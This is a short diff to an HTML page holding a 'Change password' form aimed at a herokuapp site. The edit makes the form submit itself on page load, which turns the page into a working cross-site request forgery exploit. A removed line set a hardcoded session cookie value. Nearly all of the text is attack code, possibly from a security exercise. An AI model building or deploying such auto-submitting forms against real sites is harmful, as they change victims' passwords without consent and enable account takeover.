@@ -13,7 +13,7 @@
   <h1>Change password</h1>
 <div class="panel panel-default login-panel">
   <div class="panel-body">
-    <form method="post" class="form-horizontal" action="http://silver-quire.herokuapp.com/change-password">
+    <form id="f" method="post" class="form-horizontal" action="http://silver-quire.herokuapp.com/change-password">
       <div class="form-group">
         <label for="password" class="col-sm-4 control-label">Password</label>
         <div class="col-sm-4">
@@ -36,8 +36,8 @@
 </div>
 <script>
 $(document).ready(function () {
-        document.cookie('session=eyJ1c2VyX2lkIjoxMDV9--3565e844e30c3308661838d9e17e374837a9a595');
-	$('button').trigger('click');
+       
+	$('#f').submit();
 });
 </script>
   </body>
